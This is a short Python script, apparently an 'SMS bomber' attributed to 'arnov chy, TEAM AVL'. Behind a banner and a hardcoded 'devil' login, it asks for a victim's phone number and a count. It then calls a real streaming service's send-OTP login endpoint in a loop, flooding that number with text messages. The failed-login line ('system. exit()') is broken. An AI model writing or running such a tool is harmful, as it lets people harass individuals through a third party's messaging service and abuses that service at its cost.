import sys
import requests
yellow="\033[0;33m"       # Yellow
color_off="\033[0m"       # Text Reset
blue="\033[0;34m"         # Blue
green="\033[0;32m"        # Green
red="\033[0;31m"          # Red
print(red+"""
$$$$$$$\  $$$$$$$$\ $$\    $$\ $$$$$$\ $$\       
$$  __$$\ $$  _____|$$ |   $$ |\_$$  _|$$ |      
$$ |  $$ |$$ |      $$ |   $$ |  $$ |  $$ |      
$$ |  $$ |$$$$$\    \$$\  $$  |  $$ |  $$ |      
$$ |  $$ |$$  __|    \$$\$$  /   $$ |  $$ |      
$$ |  $$ |$$ |        \$$$  /    $$ |  $$ |      
$$$$$$$  |$$$$$$$$\    \$  /   $$$$$$\ $$$$$$$$\ 
\_______/ \________|    \_/    \______|\________|
                                                 
                                                 
                                                 """+color_off)
print(red+"            developer by :arnov chy")
print("                TEAM :AVL")
usern="devil"
passwd="devil"
inpuser=str(input(green+"Enter your username :"))
inppass=str(input("Enter your password :"))
if usern==inpuser and passwd==inppass:
    print(yellow+" [√]user & password correct!")
    pass
else:
    print("[x] wrong user and password !")
    system. exit()


print(green+"""
$$$$$$$\  $$$$$$$$\ $$\    $$\ $$$$$$\ $$\       
$$  __$$\ $$  _____|$$ |   $$ |\_$$  _|$$ |      
$$ |  $$ |$$ |      $$ |   $$ |  $$ |  $$ |      
$$ |  $$ |$$$$$\    \$$\  $$  |  $$ |  $$ |      
$$ |  $$ |$$  __|    \$$\$$  /   $$ |  $$ |      
$$ |  $$ |$$ |        \$$$  /    $$ |  $$ |      
$$$$$$$  |$$$$$$$$\    \$  /   $$$$$$\ $$$$$$$$\ 
\_______/ \________|    \_/    \______|\________|
""")

print("            developer by :arnov chy")
print("                     TEAM : AVL")
number=str(input(red+" Enter your target Number : "))

amount=int(input(" Enter The Amount : "))

api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"

for i in range(amount):
    requests.get(api)
    print(str(i+1)+green+" SMS Sent")
